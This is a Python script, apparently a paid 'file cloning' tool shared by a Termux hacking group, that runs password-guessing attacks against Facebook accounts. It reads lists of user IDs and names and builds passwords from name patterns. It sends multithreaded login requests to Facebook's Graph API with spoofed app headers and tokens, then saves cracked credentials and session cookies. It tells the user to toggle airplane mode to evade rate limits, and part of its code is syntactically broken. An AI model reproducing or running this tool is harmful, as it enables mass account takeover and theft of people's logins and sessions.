#---------TG-----------
#https://t.me/KGF_TERMUX_TEAM
#__________________[ IMPORT ]__________________#
import os,uuid,random,httpx,json,sys
from time import sleep as slp
from concurrent.futures import ThreadPoolExecutor as ted
#__________________[ LOOP ]__________________#
loop=0;oks=[];cps=[];pcp=[];id=[];ugen=[];ugen2=[];tokenku=[]
#__________________[ SYS ]__________________#
sys.stdout.write('\x1b]2; KALYAN-KING🫶❤️🇧🇩\x07')
#__________________[ COLOUR ]__________________#
A = '\x1b[1;97m';R = '\x1b[38;5;196m';Y = '\033[1;33m';G = '\x1b[38;5;46m';B = '\x1b[38;5;8m';G1 = '\x1b[38;5;48m';G2 = '\x1b[38;5;47m';G3 = '\x1b[38;5;48m';G4 = '\x1b[38;5;49m';G5 = '\x1b[38;5;50m';X = '\33[1;34m';X1 = '\x1b[38;5;14m';X2 = '\x1b[38;5;123m';X3 = '\x1b[38;5;122m';X4 = '\x1b[38;5;86m';X5 = '\x1b[38;5;121m';S = '\x1b[1;96m';M = '\x1b[38;5;205m'
#__________________[ LINEX ]__________________#
def clear():os.system('clear');print(logo)
def linex():print(f'{A}──────────────────────────────────────────────────')
#__________________[ LOGO ]__________________#
logo =f"""{A}
    {G}   .dMMMb  dMP dMP dMP .aMMMb  .aMMMMP 
    {G}  dMP" VP dMP dMP dMP dMP"dMP dMP"     
    {A}  VMMMb  dMP dMP dMP dMMMMMP dMP MMP"  
    {G}dP .dMP dMP.dMP.dMP dMP dMP dMP.dMP    
    {G}VMMMP"  VMMMPVMMP" dMP dMP  VMMMP" {R}❲{G}V{A}/{G}2.7{R}❳{A}
{A}──────────────────────────────────────────────────
{R}❲{A}={R}❳{G} OWNER    {R}:{G} MD SHIMUL
{R}❲{A}={R}❳{G} FACEBOOK {R}:{G} MD SHIMUL
{R}❲{A}={R}❳{G} TOOLTYPE {R}:{G} FILE CLONING
{R}❲{A}={R}❳{G} STATUS   {R}:{G} PAID
{R}❲{A}={R}❳{G} WHATSAPP {R}:{G} +8801975549322
{A}──────────────────────────────────────────────────"""
#__________________[ MENU ]__________________#
def menu():
    clear()
    print(f'{R}❲{A}1{R}❳{G} FILE CLONING ')
    print(f'{R}❲{A}2{R}❳{G} CONTACT TOOL OWNER') 
    print(f'{R}❳{G}https://t.me/DARKCYBER420
    print(f'{R}❲{A}0{R}❳{G} EXIT SWAG ');linex()
    option=input(f'{R}❲{A}?{R}❳{G} CHOICE {R}:{G} ')
    if option in ['1','A']:
        filex()
    elif option in ['2','B']:
    	os.system('xdg-open https://t.me/KGF_TERMUX_TEAM');menu()
    else:
        exit(f'{R}❲{A}={R}❳{G} BYE BYE ')
#__________________[ FILE ]__________________#
def filex():
    clear()
    print(f'{R}❲{A}={R}❳{G} EXAMPLE {R}:{G} /sdcard/SWAG.txt');linex()
    filex=input(f'{R}❲{A}?{R}❳{G} FILE NAME {R}:{G} ')
    try:
        fo=open(filex,'r').read().splitlines()
    except FileNotFoundError:
        print(f'{R}❲{A}={R}❳{G} FILE NOT FOUND ');slp(2)
        filex()
    clear()
    print(f'{R}❲{A}1{R}❳{G} METHOD {R}❲{A}M1{R}❳{A} \n{R}❲{A}2{R}❳{G} METHOD {R}❲{A}M2{R}❳{A}  ');linex()
    mthd=input(f'{R}❲{A}?{R}❳{G} CHOICE {R}:{G} ')
    clear()
    print(f'{R}❲{A}={R}❳{G} EXAMPLE {R}:{G} BD/10-20 & OTHERS/5-10');linex()
    try:
        pas_limit=int(input(f'{R}❲{A}={R}❳{G} PASSWORD LIMIT {R}:{G} '))
    except:
        pas_limit=1
    clear()
    print(f'{R}❲{A}={R}❳{G} EXAMPLE {R}:{G} first123/firstlast/first@@@');linex()
    pas_list=[]
    for i in range(pas_limit):
        pasx=input(f'{R}❲{A}={R}❳{G} PASSWORD NO {R}❲{A}{i+1}{R}❳{G} {R}:{G} ')
        pas_list.append(pasx)
    with ted(max_workers=30) as swag:
        tl=str(len(fo))
        clear()
        print(f'{R}❲{A}={R}❳{G} TOTAL FILE UID {R}:{A} '+tl)
        print(f'{R}❲{A}={R}❳{G} TURN {R}❲{A}ON{G}/{A}OFF{R}❳{G} AIRPLANE MODE EVERY {A}3{G} MIN');linex()
        for user in fo:
            ids,names=user.split('|')
            passlist=pas_list
            if mthd in ['1','01']:
            	swag.submit(swag1,ids,names,passlist)
            elif mthd in ['2','02']:
            	swag.submit(swag2,ids,names,passlist)
    print('\033[1;37m')
    print(f'\r{A}──────────────────────────────────────────────────')
    print(f'{R}❲{A}={R}❳{G} THE PROCESS HAS BEEN COMPLETE...')
    print(f'{R}❲{A}={R}❳{G} TOTAL OK ID {R}:{G} '+str(len(oks)))
    print(f'{R}❲{A}={R}❳{G} TOTAL CP ID {R}:{M} '+str(len(cps)))
    print(f'\r{A}──────────────────────────────────────────────────')
    input(f'{R}❲{A}={R}❳{G} PRESS ENTER TO BACK ')
    main()
#__________________[ FILE METHOD M1 ]__________________#
def swag1(ids,names,passlist):
    global oks,cps,loop
    try:
        fn=names.split(' ')[0]
        try:
            ln=names.split(' ')[1]
        except:
            ln=fn
        for pw in passlist:
            sys.stdout.write(f'\r\r{R}❲{G}SWAG-M1{R}❳{A}-{R}❲{G}%s{R}❳{A}-{R}❲{G}OK{R}:{G}%s{R}❳{A}-{R}❲{G}CP{R}:{G}%s{R}❳ '%(loop,len(oks),len(cps)));sys.stdout.flush()
            pas=pw.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',names).replace('name',names.lower())
            data={'adid': str(uuid.uuid4()), 'format': 'json', 'device_id': str(uuid.uuid4()), 'email': ids, 'password': pas, 'generate_analytics_claims': '1', 'community_id': '', 'cpl': 'true', 'try_num': '1', 'family_device_id': str(uuid.uuid4()), 'credentials_type': 'password', 'source': 'login', 'error_detail_type': 'button_with_disabled', 'enroll_misauth': 'false', 'generate_session_cookies': '1', 'generate_machine_id': '1', 'currently_logged_in_userid': '0', 'locale': 'en_US', 'client_country_code': 'US', 'fb_api_req_friendly_name': 'authenticate', 'api_key': '882a8490361da98702bf97a021ddc14d', 'access_token': '350685531728|62f8ce9f74b12f84c123cc23437a4a32'}
            head={'User-Agent': 'Dalvik/2.1.0 (Linux; U; Android 10; EVR-N29 Build/HUAWEIEVR-N29) [FBAN/Orca-Android;FBAV/283.0.0.16.120;FBPN/com.facebook.orca;FBLC/en_GB;FBBV/246887380;FBCR/O2 - UK;FBMF/HUAWEI;FBBD/HUAWEI;FBDV/EVR-N29;FBSV/10;FBCA/arm64-v8a:null;FBDM/{density=3.0,width=1080,height=2068};FB_FW/1;] FBBK/1"+"Dalvik/2.1.0 (Linux; U; Android 10; VOG-L29 Build/HUAWEIVOG-L29) [FBAN/Orca-Android;FBAV/272.0.0.14.119;FBPN/com.facebook.orca;FBLC/es_ES;FBBV/228977692;FBCR/vodafone ES;FBMF/HUAWEI;FBBD/HUAWEI;FBDV/VOG-L29;FBSV/10;FBCA/arm64-v8a:null;FBDM/{density=3.0,width=1080,height=2265};FB_FW/1;] FBBK/1"+"Dalvik/2.1.0 (Linux; U; Android 6.0.1; SM-G532G Build/MMB29T) [FBAN/FB4A;FBAV/273.0.0.39.123;FBPN/com.facebook.katana;FBLC/vi_VN;FBBV/218047938;FBCR/null;FBMF/samsung;FBBD/samsung;FBDV/SM-G532G;FBSV/6.0.1;FBCA/armeabi-v7a:armeabi;FBDM/{density=1.5,width=540,height=960};FB_FW/1;FBRV/219557400;]', 'Accept-Encoding': 'gzip, deflate', 'Accept': '*/*', 'Connection': 'close', 'Content-Type': 'application/x-www-form-urlencoded', 'Host': 'graph.facebook.com', 'X-FB-Net-HNI': str(random.randint(20000,40000)), 'X-FB-SIM-HNI': str(random.randint(20000,40000)), 'Authorization': 'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32', 'X-FB-Connection-Type': 'WIFI', 'X-Tigon-Is-Retry': 'False', 'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=62f8ce9f74b12f84c123cc23437a4a32', 'x-fb-device-group': str(random.randint(1000,9999)), 'X-FB-Friendly-Name': 'ViewerReactionsMutation', 'X-FB-Request-Analytics-Tags': 'graphservice', 'X-FB-HTTP-Engine': 'Liger', 'X-FB-Client-IP': 'True', 'X-FB-Server-Cluster': 'True', 'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62'}
            url='https://graph.facebook.com/auth/login'
            req=httpx.post(url,data=data,headers=head).json()
            if 'session_key' in req:
                print(f'\r\r{G}❲SWAG-OK❳ '+ids+'|'+pas)
                cookie = ";".join(i["name"]+"="+i["value"] for i in req["session_cookies"])
                print(f"\r\r{G}❲COOKIE❳➤ "+cookie)
                open('/sdcard/SWAG-FILE-M1-OK.txt','a').write(ids+'|'+pas+ ' | ' +cookie+'\n')
                oks.append(ids)
                break
            elif 'www.facebook.com' in req['error']['message']:
                print(f'\r\r{M}❲SWAG-CP❳ '+ids+'|'+pas)
                open('/sdcard/SWAG-CP.txt','a').write(ids+'|'+pas+'\n')
                cps.append(ids)
                break
            else:
                continue
        loop+=1
    except:
        pass
#__________________[ FILE METHOD M2 ]__________________#
def swag2(ids,names,passlist):
    global oks,cps,loop
    try:
        fn=names.split(' ')[0]
        try:
            ln=names.split(' ')[1]
        except:
            ln=fn
        for pw in passlist:
            sys.stdout.write(f'\r\r{R}❲{G}SWAG-M2{R}❳{A}-{R}❲{G}%s{R}❳{A}-{R}❲{G}OK{R}:{G}%s{R}❳{A}-{R}❲{G}CP{R}:{G}%s{R}❳ '%(loop,len(oks),len(cps)));sys.stdout.flush()
            pas=pw.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',names).replace('name',names.lower())
            data={'adid': str(uuid.uuid4()), 'format': 'json', 'device_id': str(uuid.uuid4()), 'email': ids, 'password': pas, 'generate_analytics_claims': '1', 'community_id': '', 'cpl': 'true', 'try_num': '1', 'family_device_id': str(uuid.uuid4()), 'credentials_type': 'password', 'source': 'login', 'error_detail_type': 'button_with_disabled', 'enroll_misauth': 'false', 'generate_session_cookies': '1', 'generate_machine_id': '1', 'currently_logged_in_userid': '0', 'locale': 'en_US', 'client_country_code': 'US', 'fb_api_req_friendly_name': 'authenticate', 'api_key': '882a8490361da98702bf97a021ddc14d', 'access_token': '350685531728|62f8ce9f74b12f84c123cc23437a4a32'}
            head={'User-Agent': 'Dalvik/2.1.0 (Linux; U; Android 10; EVR-N29 Build/HUAWEIEVR-N29) [FBAN/Orca-Android;FBAV/283.0.0.16.120;FBPN/com.facebook.orca;FBLC/en_GB;FBBV/246887380;FBCR/O2 - UK;FBMF/HUAWEI;FBBD/HUAWEI;FBDV/EVR-N29;FBSV/10;FBCA/arm64-v8a:null;FBDM/{density=3.0,width=1080,height=2068};FB_FW/1;] FBBK/1"+"Dalvik/2.1.0 (Linux; U; Android 10; VOG-L29 Build/HUAWEIVOG-L29) [FBAN/Orca-Android;FBAV/272.0.0.14.119;FBPN/com.facebook.orca;FBLC/es_ES;FBBV/228977692;FBCR/vodafone ES;FBMF/HUAWEI;FBBD/HUAWEI;FBDV/VOG-L29;FBSV/10;FBCA/arm64-v8a:null;FBDM/{density=3.0,width=1080,height=2265};FB_FW/1;] FBBK/1"+"Dalvik/2.1.0 (Linux; U; Android 6.0.1; SM-G532G Build/MMB29T) [FBAN/FB4A;FBAV/273.0.0.39.123;FBPN/com.facebook.katana;FBLC/vi_VN;FBBV/218047938;FBCR/null;FBMF/samsung;FBBD/samsung;FBDV/SM-G532G;FBSV/6.0.1;FBCA/armeabi-v7a:armeabi;FBDM/{density=1.5,width=540,height=960};FB_FW/1;FBRV/219557400;]', 'Accept-Encoding': 'gzip, deflate', 'Accept': '*/*', 'Connection': 'close', 'Content-Type': 'application/x-www-form-urlencoded', 'Host': 'graph.facebook.com', 'X-FB-Net-HNI': str(random.randint(20000,40000)), 'X-FB-SIM-HNI': str(random.randint(20000,40000)), 'Authorization': 'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32', 'X-FB-Connection-Type': 'WIFI', 'X-Tigon-Is-Retry': 'False', 'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=62f8ce9f74b12f84c123cc23437a4a32', 'x-fb-device-group': str(random.randint(1000,9999)), 'X-FB-Friendly-Name': 'ViewerReactionsMutation', 'X-FB-Request-Analytics-Tags': 'graphservice', 'X-FB-HTTP-Engine': 'Liger', 'X-FB-Client-IP': 'True', 'X-FB-Server-Cluster': 'True', 'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62'}
            url='https://graph.facebook.com/auth/login'
            req=httpx.post(url,data=data,headers=head).json()
            if 'session_key' in req:
                print(f'\r\r{G}❲SWAG-OK❳ '+ids+'|'+pas)
                cookie = ";".join(i["name"]+"="+i["value"] for i in req["session_cookies"])
                print(f"\r\r{G}❲COOKIE❳➤ "+cookie)
                open('/sdcard/SWAG-FILE-M2-OK.txt','a').write(ids+'|'+pas+ ' | ' +cookie+'\n')
                oks.append(ids)
                break
            elif 'www.facebook.com' in req['error']['message']:
                print(f'\r\r{M}❲SWAG-CP❳ '+ids+'|'+pas)
                open('/sdcard/SWAG-CP.txt','a').write(ids+'|'+pas+'\n')
                cps.append(ids)
                break
            else:
                continue
        loop+=1
    except:
        pass
#__________________[ END ]__________________#
menu()
